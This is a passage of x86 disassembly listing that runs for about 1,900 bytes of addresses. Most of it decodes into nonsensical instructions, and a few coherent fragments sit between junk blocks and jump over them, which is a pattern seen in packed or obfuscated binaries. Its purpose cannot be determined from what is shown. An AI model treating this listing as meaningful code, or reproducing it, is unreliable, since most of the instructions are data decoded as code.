  4067d6:	mov    al,0xf1
  4067d8:	jmp    0x4067aa
  4067da:	or     BYTE PTR [esi-0x28e6b52e],bh
  4067e0:	in     al,dx
  4067e1:	jo     0x40678d
  4067e3:	call   0xb2addb5b
  4067e8:	xchg   esi,eax
  4067e9:	not    ebx
  4067eb:	cdq    
  4067ec:	stos   BYTE PTR es:[edi],al
  4067ed:	ja     0x40677f
  4067ef:	adc    DWORD PTR [edi],edx
  4067f1:	popf   
  4067f2:	ficom  DWORD PTR [edi+0xa887d4b]
  4067f8:	sub    eax,0x203a0dd
  4067fd:	stos   BYTE PTR es:[edi],al
  4067fe:	inc    ebp
  4067ff:	mov    ecx,0x79578b9b
  406804:	mov    eax,0xe3848426
  406809:	mov    bh,0x40
  40680b:	fwait
  40680c:	in     al,dx
  40680d:	es pop ebx
  40680f:	push   ecx
  406810:	ja     0x406882
  406812:	pop    ebp
  406813:	cmp    eax,DWORD PTR [ebx-0x30]
  406816:	jle    0x40680b
  406818:	mov    dh,0xb7
  40681a:	(bad)  
  40681b:	xor    al,0xfc
  40681d:	out    dx,al
  40681e:	push   es
  40681f:	cs cmc 
  406821:	(bad)  
  406822:	call   0x723bbe91
  406827:	dec    esp
  406828:	adc    bl,BYTE PTR [edi+0x5e]
  40682b:	call   0x8625:0xd153add2
  406832:	push   esp
  406833:	outs   dx,BYTE PTR ds:[esi]
  406834:	gs xchg edx,eax
  406836:	and    BYTE PTR [ecx-0x2a],ch
  406839:	xchg   ecx,eax
  40683a:	mov    eax,ds:0xaa9be264
  40683f:	loope  0x4067c7
  406841:	imul   edi,DWORD PTR [ebx-0x1938ed14],0x34663ed9
  40684b:	(bad)
  40684e:	dec    esp
  40684f:	push   eax
  406850:	out    dx,al
  406851:	mov    ?,WORD PTR [ebp-0x18e6f47a]
  406857:	lds    esi,FWORD PTR [ebx]
  406859:	div    DWORD PTR [ecx]
  40685b:	fst    QWORD PTR [edx+edx*1+0x1d673a72]
  406862:	mov    ecx,0x41cc38b2
  406867:	push   edi
  406868:	pop    esi
  406869:	scas   eax,DWORD PTR es:[edi]
  40686a:	dec    bx
  40686c:	fmul   QWORD PTR [edi]
  40686e:	mov    bh,0xc3
  406870:	jp     0x40689a
  406872:	add    ch,BYTE PTR [esi]
  406874:	push   eax
  406875:	pop    ds
  406876:	pop    ebx
  406877:	pop    esi
  406878:	push   edi
  406879:	pop    es
  40687a:	pushf  
  40687b:	mov    al,ds:0x813bdcca
  406880:	out    0xd3,eax
  406882:	ret    
  406883:	xor    BYTE PTR [edx],dh
  406885:	inc    ecx
  406886:	test   dl,ch
  406888:	div    ebp
  40688a:	sbb    dl,cl
  40688c:	jmp    0xb4e7fad0
  406891:	ins    BYTE PTR es:[edi],dx
  406892:	stc    
  406893:	jecxz  0x40685a
  406895:	mov    ebx,0x4265b84e
  40689a:	inc    ebp
  40689b:	pop    edx
  40689c:	test   eax,0xee071178
  4068a1:	shl    BYTE PTR ds:0xa13173ee,cl
  4068a7:	mov    al,0xa0
  4068a9:	hlt    
  4068aa:	ins    BYTE PTR es:[edi],dx
  4068ab:	cmp    dh,BYTE PTR [esi+0x6d]
  4068ae:	cmp    ch,dl
  4068b0:	inc    edx
  4068b1:	xchg   esp,eax
  4068b2:	cld    
  4068b3:	les    edi,FWORD PTR [esi]
  4068b5:	push   es
  4068b6:	xchg   edx,eax
  4068b7:	xchg   BYTE PTR [eax],ah
  4068b9:	push   esi
  4068ba:	shr    BYTE PTR [ecx-0xa18419d],cl
  4068c0:	sub    eax,0x57d967ec
  4068c5:	cmp    ecx,DWORD PTR [ecx-0x66]
  4068c8:	pop    ebx
  4068c9:	pop    esp
  4068ca:	dec    esi
  4068cb:	jbe    0x4068b3
  4068cd:	popf   
  4068ce:	xor    eax,0x6ba10091
  4068d3:	add    bh,BYTE PTR [edx]
  4068d5:	adc    esp,DWORD PTR [ecx+0x5d27361b]
  4068db:	in     eax,dx
  4068dc:	clc    
  4068dd:	jno    0x4068c8
  4068df:	adc    BYTE PTR [ecx+0x35b07292],dh
  4068e5:	ret    
  4068e6:	call   0xb67610e7
  4068eb:	out    dx,al
  4068ec:	fidiv  WORD PTR ds:0xaf00c3c5
  4068f2:	popa   
  4068f3:	or     al,0x46
  4068f5:	mov    ah,0xba
  4068f7:	jo     0x406964
  4068f9:	stos   DWORD PTR es:[edi],eax
  4068fa:	pop    ecx
  4068fb:	dec    eax
  4068fc:	xchg   ebp,eax
  4068fd:	pop    ecx
  4068fe:	mov    ch,0xd7
  406900:	jbe    0x4068ab
  406902:	xchg   edi,eax
  406903:	and    eax,0x485f44ee
  406908:	mov    ecx,0x59ab5b06
  40690d:	iret   
  40690e:	loope  0x406895
  406910:	lods   al,BYTE PTR ds:[esi]
  406911:	mov    ecx,0xb4c3845c
  406916:	mov    ds,WORD PTR [edi+ecx*1]
  406919:	cld    
  40691a:	inc    ecx
  40691b:	jl     0x40691f
  40691d:	fdivrp st(1),st
  40691f:	lods   eax,DWORD PTR ds:[esi]
  406920:	out    0x5c,al
  406922:	mov    bh,0x9b
  406924:	dec    esp
  406925:	(bad)  
  406926:	lea    ebx,[edi]
  406928:	and    BYTE PTR [ecx-0x4a],bh
  40692b:	(bad)  [eax+0x47]
  40692e:	faddp  st(3),st
  406930:	in     eax,dx
  406931:	data16 icebp 
  406933:	jg     0x40693f
  406935:	lea    edi,[ebx-0x45]
  406938:	mov    cl,0xd7
  40693a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40693b:	adc    eax,0x50a1304f
  406940:	push   ss
  406941:	pop    esp
  406942:	cmp    eax,0xe2cfc50d
  406947:	ror    DWORD PTR [edi+0x308f94cd],1
  40694d:	mov    ebp,0xf7fb950
  406952:	and    ecx,DWORD PTR [eax]
  406954:	mov    ?,WORD PTR [esi]
  406956:	or     BYTE PTR [edi],al
  406958:	sbb    BYTE PTR [esi],dh
  40695a:	and    bl,BYTE PTR [ecx+0xc]
  40695d:	je     0x40699e
  40695f:	jg     0x40690d
  406961:	pusha  
  406962:	popa   
  406963:	or     al,0x79
  406965:	cmp    eax,0x63a1f065
  40696a:	mov    ch,0x3
  40696c:	out    0xc0,al
  40696e:	jns    0x4068f5
  406970:	sbb    al,BYTE PTR [edi-0x6a0cfaa6]
  406976:	and    BYTE PTR [eax+ecx*2-0x108ef414],ah
  40697d:	rcl    ebp,cl
  40697f:	pop    ss
  406980:	xor    al,0x9a
  406982:	push   0xdab8ad20
  406987:	add    al,0x97
  406989:	test   al,0x4f
  40698b:	enter  0xb406,0x66
  40698f:	fmul   DWORD PTR [ecx+ebp*4]
  406992:	aad    0x4f
  406994:	pushf  
  406995:	push   ebp
  406996:	mov    DWORD PTR [esi+edi*1],ebx
  406999:	inc    eax
  40699a:	int    0xe8
  40699c:	push   cs
  40699d:	das    
  40699e:	shl    DWORD PTR [eax],1
  4069a0:	out    0xc9,eax
  4069a2:	lods   eax,DWORD PTR ds:[esi]
  4069a3:	(bad)  
  4069a4:	enter  0xdeb2,0xff
  4069a8:	outs   dx,DWORD PTR ds:[esi]
  4069a9:	and    BYTE PTR [esi+0x50],ah
  4069ac:	or     eax,0x5af916b3
  4069b1:	add    ebp,DWORD PTR [ecx]
  4069b3:	mov    DWORD PTR [eax],ecx
  4069b5:	mov    edi,0x9424f566
  4069ba:	(bad)  
  4069bb:	mov    ah,0x2
  4069bd:	push   0xffffff94
  4069bf:	popf   
  4069c0:	int    0xd8
  4069c2:	mov    DWORD PTR [ecx],eax
  4069c4:	mov    eax,DWORD PTR [ebp-0x24]
  4069c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4069ca:	xor    eax,esi
  4069cc:	add    eax,edi
  4069ce:	mov    DWORD PTR [ecx+0x4],eax
  4069d1:	mov    eax,DWORD PTR [ebp-0x2c]
  4069d4:	mov    ecx,DWORD PTR [ebp-0x8]
  4069d7:	mov    DWORD PTR [ecx+0x8],eax
  4069da:	mov    eax,DWORD PTR [ebp-0x30]
  4069dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4069e0:	jmp    0x406eeb
  4069e5:	ror    dh,1
  4069e7:	rol    edi,1
  4069e9:	fxch   st(3)
  4069eb:	fcmove st,st(5)
  4069ed:	xor    cl,BYTE PTR [esi-0x1e]
  4069f0:	shl    DWORD PTR [ebx+0x4a047f03],1
  4069f6:	int    0x78
  4069f8:	js     0x406a64
  4069fa:	jl     0x406a74
  4069fc:	js     0x4069c5
  4069fe:	pop    eax
  4069ff:	sbb    edi,ebp
  406a01:	and    ch,bh
  406a03:	aad    0xd2
  406a05:	pop    ds
  406a06:	cmp    dh,BYTE PTR [ecx+0x486211e6]
  406a0c:	xchg   edx,eax
  406a0d:	test   ebx,ebp
  406a0f:	(bad)
  406a12:	push   edi
  406a13:	jbe    0x406a0c
  406a15:	inc    esi
  406a16:	xor    eax,0x908b4e34
  406a1b:	push   eax
  406a1c:	dec    edx
  406a1d:	add    eax,0xcdef5e66
  406a22:	into   
  406a23:	or     al,0x3a
  406a25:	lahf   
  406a26:	inc    ecx
  406a27:	pop    ebp
  406a28:	(bad)  
  406a29:	mov    eax,0x28ee594
  406a2e:	inc    edi
  406a2f:	out    dx,eax
  406a30:	xchg   ebp,eax
  406a31:	xchg   ah,cl
  406a33:	inc    edx
  406a34:	jae    0x406a2b
  406a36:	test   DWORD PTR [ebp+eax*8+0x392cb601],eax
  406a3d:	out    0x3e,al
  406a3f:	arpl   WORD PTR [eax-0x2c],dx
  406a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a43:	mov    BYTE PTR [edi],al
  406a45:	jecxz  0x406a55
  406a47:	inc    BYTE PTR [ecx-0x3c]
  406a4a:	dec    ebp
  406a4b:	pop    ecx
  406a4c:	add    eax,DWORD PTR [ebx-0x516b44cf]
  406a52:	inc    edi
  406a53:	mov    edx,0xc539cfd4
  406a58:	sbb    al,0xc3
  406a5a:	ins    BYTE PTR es:[edi],dx
  406a5b:	xchg   esp,eax
  406a5c:	(bad)  
  406a5d:	and    esi,DWORD PTR [ebx+0x47dc9919]
  406a63:	fwait
  406a64:	bound  ebp,QWORD PTR [ebx+0x1dd7930f]
  406a6a:	adc    esi,ebp
  406a6c:	bound  edx,QWORD PTR [ebx]
  406a6e:	pop    edi
  406a6f:	mov    al,ds:0xd7694a68
  406a74:	int3   
  406a75:	loope  0x406af1
  406a77:	add    ecx,ebp
  406a79:	dec    edx
  406a7a:	add    BYTE PTR [ecx-0x7431aa94],ah
  406a80:	sbb    bl,BYTE PTR ds:0x1618404b
  406a86:	xchg   edx,eax
  406a87:	pop    eax
  406a88:	fdivr  QWORD PTR [ebx-0x69]
  406a8b:	push   edx
  406a8c:	rol    BYTE PTR [ebx+0x54],0x9
  406a90:	jnp    0x406aff
  406a92:	and    ch,BYTE PTR [edx+0x79]
  406a95:	lea    ebp,es:0x964db0b3
  406a9c:	push   edi
  406a9d:	clc    
  406a9e:	sub    dl,BYTE PTR [ebx]
  406aa0:	les    eax,FWORD PTR [ecx-0xa]
  406aa3:	push   ebp
  406aa4:	gs aad 0x7e
  406aa7:	(bad)  
  406aa9:	or     eax,0x5b0a406c
  406aae:	push   ss
  406aaf:	xrelease mov BYTE PTR [ebp+ecx*1+0x1e],0xe8
  406ab5:	push   0xffffff9b
  406ab7:	mov    ax,0xb269
  406abb:	in     eax,dx
  406abc:	jnp    0x406a95
  406abe:	xlat   BYTE PTR ds:[ebx]
  406abf:	and    BYTE PTR [ecx],bh
  406ac1:	mov    bh,0x91
  406ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac4:	test   eax,esp
  406ac6:	jnp    0x406a82
  406ac8:	mov    BYTE PTR gs:[ebx],bh
  406acb:	push   cs
  406acc:	cmc    
  406acd:	neg    DWORD PTR [ebp+0x46c63b7c]
  406ad3:	retf   
  406ad4:	and    esi,DWORD PTR [edi-0x6d0aebbc]
  406ada:	mov    al,0xc8
  406adc:	pop    es
  406add:	mov    ebx,0xd1f21c00
  406ae2:	inc    eax
  406ae3:	daa    
  406ae4:	fwait
  406ae5:	sahf   
  406ae6:	sub    ah,dh
  406ae8:	aam    0x96
  406aea:	popf   
  406aeb:	int3   
  406aec:	cmp    eax,0x6bd203f6
  406af1:	arpl   WORD PTR ds:0xb3c08ae5,sp
  406af7:	inc    eax
  406af8:	push   cs
  406af9:	pop    ebp
  406afa:	(bad)  
  406afc:	adc    BYTE PTR [ecx],cl
  406afe:	or     al,0x5
  406b00:	push   DWORD PTR [ebx]
  406b02:	rdpmc  
  406b04:	mov    ds:0x4728f62a,al
  406b09:	sub    ch,BYTE PTR [ecx]
  406b0b:	enter  0xf5c7,0x76
  406b0f:	mov    al,BYTE PTR [ebx+0x29a7fe0b]
  406b15:	jp     0x406b8a
  406b17:	pusha  
  406b18:	xchg   edi,eax
  406b19:	retf   0xf77d
  406b1c:	mov    ds:0xd6c517b3,al
  406b21:	and    edx,edi
  406b23:	leave  
  406b24:	adc    ah,BYTE PTR [edi+0x59]
  406b27:	push   es
  406b28:	leave  
  406b29:	arpl   WORD PTR [edi+0x27],cx
  406b2c:	xor    DWORD PTR [esi+0x51],esi
  406b2f:	(bad)  
  406b30:	sar    BYTE PTR [esi+ebp*8],cl
  406b33:	mov    esi,0x3309f408
  406b38:	and    al,0x81
  406b3a:	sti    
  406b3b:	adc    al,0x7f
  406b3d:	dec    eax
  406b3e:	cwde   
  406b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b40:	mov    DWORD PTR [ebp-0x68],ebx
  406b43:	sahf   
  406b44:	mov    edi,0xc0361c00
  406b49:	pop    ds
  406b4a:	or     dl,bl
  406b4c:	repnz imul ecx,DWORD PTR [ebp-0x74],0xffffffee
  406b51:	popa   
  406b52:	sbb    bl,BYTE PTR [esi]
  406b54:	mov    eax,ds:0xea1ae1a0
  406b59:	jns    0x406bc3
  406b5b:	arpl   WORD PTR [esi+edx*2+0x63],sp
  406b5f:	inc    ebp
  406b60:	mov    dh,0x18
  406b62:	add    eax,0x5b22b1a3
  406b67:	mov    ch,0xd7
  406b69:	pop    ecx
  406b6a:	dec    ebx
  406b6b:	hlt    
  406b6c:	jae    0x406be0
  406b6e:	fist   WORD PTR [eax+0x78]
  406b71:	jle    0x406af6
  406b73:	or     cl,al
  406b75:	int3   
  406b76:	dec    edx
  406b77:	pop    edi
  406b78:	inc    esp
  406b79:	jo     0x406b8a
  406b7b:	call   0x74aa:0xbfa93333
  406b82:	adc    dh,BYTE PTR [ebx-0x7d576aae]
  406b88:	xlat   BYTE PTR ds:[ebx]
  406b89:	adc    eax,0xa94c46d3
  406b8e:	jno    0x406bc9
  406b90:	js     0x406b16
  406b92:	mov    ch,0xbb
  406b94:	dec    esp
  406b95:	pusha  
  406b96:	arpl   cx,dx
  406b98:	fdiv   QWORD PTR [eax]
  406b9a:	and    eax,0xfd1a4a87
  406b9f:	jmp    0xf965:0xb843d3ca
  406ba6:	or     DWORD PTR [edi-0x635f46dc],ebp
  406bac:	stos   DWORD PTR es:[edi],eax
  406bad:	stos   BYTE PTR es:[edi],al
  406bae:	aad    0x95
  406bb0:	repnz inc edi
  406bb2:	adc    BYTE PTR [edi-0x7f],cl
  406bb5:	sub    al,0xdd
  406bb7:	nop
  406bb8:	mov    esp,0xe570cdb0
  406bbd:	jl     0x406c17
  406bbf:	popf   
  406bc0:	(bad)  
  406bc1:	jbe    0x406bfd
  406bc3:	sbb    bl,BYTE PTR [edx+0x38b830f6]
  406bc9:	and    al,0x1
  406bcb:	mov    ch,0x39
  406bcd:	mov    ecx,0x36787311
  406bd2:	nop
  406bd3:	xor    bh,bl
  406bd5:	aaa    
  406bd6:	and    al,0x53
  406bd8:	ss lahf 
  406bda:	je     0x406b8f
  406bdc:	scas   eax,DWORD PTR es:[edi]
  406bdd:	inc    ebp
  406bde:	js     0x406c20
  406be0:	ins    DWORD PTR es:[edi],dx
  406be1:	das    
  406be2:	ret    0xd874
  406be5:	rol    BYTE PTR [edx+0x3cb77797],cl
  406beb:	push   esi
  406bec:	dec    edi
  406bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bee:	or     DWORD PTR [eax+0xb0f939f],ebp
  406bf4:	fmul   QWORD PTR [ecx]
  406bf6:	and    ch,ah
  406bf8:	cmp    bl,BYTE PTR [ebx+0x56207044]
  406bfe:	aaa    
  406bff:	jns    0x406ba4
  406c01:	jg     0x406c74
  406c03:	jnp    0x406b8f
  406c05:	mov    fs,WORD PTR [ebx]
  406c07:	test   eax,0x1832c76f
  406c0c:	or     DWORD PTR [ecx+ecx*4+0x50],edx
  406c10:	push   eax
  406c11:	lock pop eax
  406c13:	sub    al,0x76
  406c15:	int3   
  406c16:	ja     0x406c0c
  406c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c19:	in     al,0xd4
  406c1b:	push   esi
  406c1c:	ins    DWORD PTR es:[edi],dx
  406c1d:	pop    ss
  406c1e:	mov    al,0xfd
  406c20:	sub    edi,DWORD PTR [edx]
  406c22:	jo     0x406c4a
  406c24:	iret   
  406c25:	adc    al,0xc8
  406c27:	adc    BYTE PTR [edi+ecx*2-0x22],0x84
  406c2c:	hlt    
  406c2d:	push   ebp
  406c2e:	shr    BYTE PTR [eax+0x3605cff],0xca
  406c35:	jmp    0xafd54b2b
  406c3a:	ret    0xf0d5
  406c3d:	jno    0x406be8
  406c3f:	push   ebp
  406c40:	pop    ecx
  406c41:	repnz sub bl,BYTE PTR [eax]
  406c44:	inc    eax
  406c45:	outs   dx,BYTE PTR ds:[esi]
  406c46:	jl     0x406c24
  406c48:	test   eax,0xf8fbae52
  406c4d:	pop    ecx
  406c4e:	xchg   edi,eax
  406c4f:	std    
  406c50:	add    eax,0xb58ceb54
  406c55:	int    0x7b
  406c57:	cmp    BYTE PTR [ebx],ah
  406c59:	push   esi
  406c5a:	out    dx,eax
  406c5b:	xor    BYTE PTR [ecx+0x16743e03],dl
  406c61:	xor    dl,BYTE PTR [eax+0x6e]
  406c64:	sub    ebx,ecx
  406c66:	jg     0x406c08
  406c68:	retf   
  406c69:	push   eax
  406c6a:	not    DWORD PTR [eax+ebp*1]
  406c6d:	fcomi  st,st(7)
  406c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c70:	jae    0x406cde
  406c72:	mov    edx,0xf1e206c2
  406c77:	push   ss
  406c78:	fld    QWORD PTR [ebx-0x190bc163]
  406c7e:	or     DWORD PTR [edx+0xb26f2fe],0xffffff8c
  406c85:	stos   BYTE PTR es:[edi],al
  406c86:	jle    0x406d04
  406c88:	jae    0x406ce8
  406c8a:	cmp    eax,0x75def830
  406c8f:	mov    fs:0x608fd8d3,al
  406c95:	sub    edi,DWORD PTR [edx]
  406c97:	(bad)  
  406c99:	pusha  
  406c9a:	cli    
  406c9b:	sbb    DWORD PTR [eax],esp
  406c9d:	pop    ss
  406c9e:	(bad)  
  406c9f:	mov    dl,0xe0
  406ca1:	mov    al,0x93
  406ca3:	adc    ebp,esi
  406ca5:	out    0xcd,eax
  406ca7:	xchg   edi,eax
  406ca8:	jg     0x406cbc
  406caa:	fnstenv [ebx+0x64]
  406cad:	pop    edi
  406cae:	adc    esi,ecx
  406cb0:	not    dh
  406cb2:	cmp    eax,0x8853ed60
  406cb7:	call   0x9b30:0x7dbea0bf
  406cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cbf:	fnstsw WORD PTR [edi]
  406cc1:	jnp    0x406d0b
  406cc3:	imul   BYTE PTR [esi+0x3d0c52f7]
  406cc9:	add    esp,DWORD PTR [esi]
  406ccb:	in     eax,dx
  406ccc:	aad    0xe4
  406cce:	test   eax,0x25433972
  406cd3:	rol    dh,0x65
  406cd6:	cmp    BYTE PTR [esi-0xf1e41ef],ch
  406cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cdd:	jne    0x406d00
  406cdf:	popf   
  406ce0:	mov    BYTE PTR [edx],dh
  406ce2:	adc    DWORD PTR [edx],eax
  406ce4:	fstp   QWORD PTR [edi]
  406ce6:	enter  0x4f53,0xbd
  406cea:	std    
  406ceb:	push   cs
  406cec:	xor    BYTE PTR [ebp+0x14],cl
  406cef:	ror    ch,1
  406cf1:	addr16 dec esp
  406cf3:	in     al,0xcd
  406cf5:	jle    0x406c7e
  406cf7:	out    0x1d,al
  406cf9:	lock sub al,cl
  406cfc:	pop    esi
  406cfd:	int3   
  406cfe:	adc    ebx,DWORD PTR [ebx]
  406d00:	sbb    ah,cl
  406d02:	rcl    DWORD PTR [edx],cl
  406d04:	dec    ebp
  406d05:	xchg   ecx,eax
  406d06:	ficomp DWORD PTR [ecx]
  406d08:	jg     0x406ccb
  406d0a:	mov    dh,0xeb
  406d0c:	sbb    eax,0x8c5eed94
  406d11:	retf   
  406d12:	cmp    cl,BYTE PTR [ecx-0xf]
  406d15:	jle    0x406c9b
  406d17:	adc    ch,BYTE PTR [edi-0x23]
  406d1a:	and    ch,BYTE PTR [edi]
  406d1c:	add    eax,0x852a11a9
  406d21:	test   eax,0x1f2c8da7
  406d26:	push   cs
  406d27:	(bad)  
  406d28:	jno    0x406cca
  406d2a:	mov    esp,0xdc2ceb56
  406d2f:	(bad)  
  406d30:	sub    ebp,esp
  406d32:	call   0xbdf28087
  406d37:	add    al,dl
  406d39:	adc    eax,0xb0690ef6
  406d3e:	push   ss
  406d3f:	xchg   BYTE PTR [ebp-0x44],al
  406d42:	add    al,BYTE PTR [eax+0x47]
  406d45:	inc    esp
  406d46:	inc    edi
  406d47:	dec    esp
  406d48:	hlt    
  406d49:	popa   
  406d4a:	cmp    eax,0xb7684c68
  406d4f:	inc    esi
  406d50:	sti    
  406d51:	call   0x8ba70656
  406d56:	pop    eax
  406d57:	mov    esi,0x3fdd444e
  406d5c:	and    al,0xca
  406d5e:	imul   ebp,DWORD PTR [ebp+0x33],0xc6c531e
  406d65:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  406d67:	jecxz  0x406dcc
  406d69:	jno    0x406dc1
  406d6b:	aaa    
  406d6c:	pop    es
  406d6d:	sbb    DWORD PTR ds:0x845d0e57,esp
  406d73:	sti    
  406d74:	lock aaa 
  406d76:	cmp    BYTE PTR [esi],0x9d
  406d79:	xor    BYTE PTR [eax],cl
  406d7b:	daa    
  406d7c:	inc    esi
  406d7d:	push   0xff2adb3c
  406d82:	xor    al,0xfa
  406d84:	mov    ebx,0x658c5ede
  406d89:	mov    ebp,0x3b14101
  406d8e:	aad    0x2c
  406d90:	loop   0x406df7
  406d92:	aad    0x7d
  406d94:	jo     0x406d2e
  406d96:	jmp    0xcdfc7e51
  406d9b:	push   0x9d6a18ba
  406da0:	push   ss
  406da1:	or     DWORD PTR [ecx+eiz*2],ecx
  406da4:	mov    al,BYTE PTR [edx-0x14e8d3df]
  406daa:	jmp    0xfbcf4ddc
  406daf:	add    eax,0x58b81f5d
  406db4:	cmc    
  406db5:	pop    edi
  406db6:	fimul  DWORD PTR [ecx+0x2d30786]
  406dbc:	in     eax,dx
  406dbd:	pushf  
  406dbe:	pusha  
  406dbf:	(bad)  
  406dc0:	retf   
  406dc1:	dec    ebx
  406dc2:	inc    ebp
  406dc3:	sub    DWORD PTR cs:[ebp+0x3fd5e604],eax
  406dca:	mov    eax,ds:0xfe0458eb
  406dcf:	scas   eax,DWORD PTR es:[edi]
  406dd0:	test   ebp,0x9ebd6ed1
  406dd6:	cmp    al,0xb0
  406dd8:	sub    bh,BYTE PTR [edx]
  406dda:	sti    
  406ddb:	aaa    
  406ddc:	fidiv  DWORD PTR cs:[eax+0x3d785054]
  406de3:	and    BYTE PTR [edx+0x7e34cfa8],ah
  406de9:	out    0xaa,al
  406deb:	jmp    0x65d4:0xe725f7b9
  406df2:	outs   dx,BYTE PTR ds:[esi]
  406df3:	test   eax,0x6878e14e
  406df8:	sbb    BYTE PTR [eax-0x18eeb405],bl
  406dfe:	mov    esp,0xa2a3bee1
  406e03:	les    edx,FWORD PTR [esi]
  406e05:	sub    al,0x1c
  406e07:	out    dx,eax
  406e08:	push   0x34bfbbac
  406e0d:	jmp    0x8a1d:0xbf97adfa
  406e14:	into   
  406e15:	mul    BYTE PTR [eax]
  406e17:	aas    
  406e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e19:	jge    0x406e0d
  406e1b:	sbb    ah,BYTE PTR [ecx]
  406e1d:	in     al,0x7c
  406e1f:	pop    esi
  406e20:	cmp    ebx,DWORD PTR [edx]
  406e22:	cs cmp ah,cl
  406e25:	fcomp  st(2)
  406e27:	pop    edx
  406e28:	mov    esi,DWORD PTR [ecx-0x20]
  406e2b:	cli    
  406e2c:	push   esp
  406e2d:	add    DWORD PTR [eax+0x12],edi
  406e30:	add    esi,DWORD PTR [ebx+0x1024bf91]
  406e36:	jl     0x406dd5
  406e38:	xlat   BYTE PTR ds:[ebx]
  406e39:	push   eax
  406e3a:	call   0x69ad404d
  406e3f:	cmp    esp,DWORD PTR [esi]
  406e41:	mov    ch,0x7c
  406e43:	or     DWORD PTR [ecx-0x5055eb42],0x6f
  406e4a:	fdivr  DWORD PTR [esi-0x3b]
  406e4d:	mov    ah,0xe2
  406e50:	mov    cl,0xa1
  406e52:	inc    edx
  406e53:	xchg   ebp,eax
  406e54:	loope  0x406eac
  406e56:	arpl   cx,di
  406e58:	stos   DWORD PTR es:[edi],eax
  406e59:	lahf   
  406e5a:	inc    ecx
  406e5b:	cdq    
  406e5c:	or     al,0x7e
  406e5e:	test   BYTE PTR [ebp+0x2fbdb645],0x48
  406e65:	inc    DWORD PTR [edi]
  406e67:	mov    bl,0x63
  406e69:	aaa    
  406e6a:	ds push es
  406e6c:	push   eax
  406e6d:	dec    esi
  406e6e:	retf   0xff36
  406e71:	push   0x2b906fcf
  406e76:	imul   ecx,DWORD PTR [eax-0x352f286b],0x2a
  406e7d:	cmp    eax,0x18462fc8
  406e82:	outs   dx,DWORD PTR ds:[esi]
  406e83:	jl     0x406e42
  406e85:	daa    
  406e86:	cmp    eax,0xba3bb3c3
  406e8b:	dec    ebx
  406e8c:	mov    bh,0x2b
  406e8e:	mov    BYTE PTR [edi-0x3e4948eb],0x78
  406e95:	pop    es
  406e96:	mov    DWORD PTR [esi-0x79],esi
  406e99:	pop    ebx
  406e9a:	neg    DWORD PTR [edi+0x52c37051]
  406ea0:	push   ebp
  406ea1:	pop    ebp
  406ea2:	mov    esi,0xa6fa62f5
  406ea7:	daa    
  406ea8:	and    al,0xa4
  406eaa:	xor    bl,BYTE PTR [ebx]
  406eac:	es sahf 
  406eae:	fldlg2 
  406eb0:	sahf   
  406eb1:	sub    eax,DWORD PTR [ebx]
  406eb3:	lahf   
  406eb4:	sahf   
  406eb5:	loopne 0x406eb6
  406eb7:	mov    ebx,0x5e85de98
  406ebc:	cs push cs
  406ebe:	dec    ecx
  406ebf:	fadd   DWORD PTR [ebx]
  406ec1:	jmp    0xf5c3:0x6457b44a
  406ec8:	mov    gs,WORD PTR [edi+eax*4+0x1c]
  406ecc:	rcr    edi,cl
  406ece:	out    0xf4,eax
  406ed0:	mov    ds:0x47568a40,al
  406ed5:	inc    esp
  406ed6:	adc    BYTE PTR [ecx+ebp*2],ah
  406ed9:	or     DWORD PTR [esi],ebp
  406edb:	retf   0x9c29
  406ede:	adc    al,0x3d
  406ee0:	inc    esi
  406ee1:	fadd   QWORD PTR [ebp-0x70d5c0f0]
  406ee7:	dec    ecx
  406ee8:	(bad)  
  406ee9:	mov    edx,0xc418992
  406eee:	mov    eax,DWORD PTR [ebp-0x34]
  406ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  406ef4:	jmp    0x4073ff
  406ef9:	ror    ecx,1
  406efb:	ror    cl,cl
  406efd:	fcmovu st,st(1)
  406eff:	(bad)  
  406f01:	aas    
  406f02:	scas   eax,DWORD PTR es:[edi]
  406f03:	push   ebp
  406f04:	cmp    DWORD PTR [eax-0x4be2eb04],0xffffffd0
  406f0b:	js     0x406f85
  406f0d:	push   0x7c
  406f0f:	js     0x406f89
  406f11:	and    DWORD PTR fs:[ebx+0x59b530d3],edx
  406f18:	push   edi
  406f19:	push   esp
  406f1a:	ins    DWORD PTR es:[edi],dx
  406f1b:	jno    0x406eec
  406f1d:	cmp    BYTE PTR [eax],cl
  406f1f:	aam    0xeb
  406f21:	repz fs in eax,0x98
  406f25:	hlt    
  406f26:	add    bh,dh
  406f28:	and    BYTE PTR [ecx+edi*1-0x1eb1c27],bh
  406f2f:	rcl    DWORD PTR [eax-0x4978781e],0xaf
  406f36:	or     edi,DWORD PTR [esi]
  406f38:	outs   dx,DWORD PTR ds:[esi]
  406f39:	aam    0xb8
  406f3b:	call   0x3bd5:0x8c7cf82c
  406f42:	inc    ecx
  406f43:	cmp    ecx,DWORD PTR [edx+ebp*4]
  406f46:	push   0x28f457b0
  406f4b:	pop    ebp
  406f4c:	ins    BYTE PTR es:[edi],dx
  406f4d:	xchg   edi,eax
  406f4e:	jecxz  0x406ed0
  406f50:	cwde   
  406f51:	stos   BYTE PTR es:[edi],al
  406f52:	pop    ebp
  406f53:	js     0x406f05
  406f55:	test   eax,0xbbf0a4ce
  406f5a:	popf   
  406f5b:	cs jp  0x406fb4
  406f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f5f:	and    DWORD PTR [ecx-0x2939fe10],0x1d06135e
  406f69:	xchg   DWORD PTR [esi],eax
  406f6b:	or     edx,DWORD PTR ss:[ecx+0x1715f46d]
  406f72:	mov    ds,WORD PTR [edx-0x20759c8c]
  406f78:	mov    dl,0x51
  406f7a:	(bad)  
  406f7b:	jnp    0x406f2c
  406f7d:	aaa    
  406f7e:	lea    ecx,[eax+0x73]
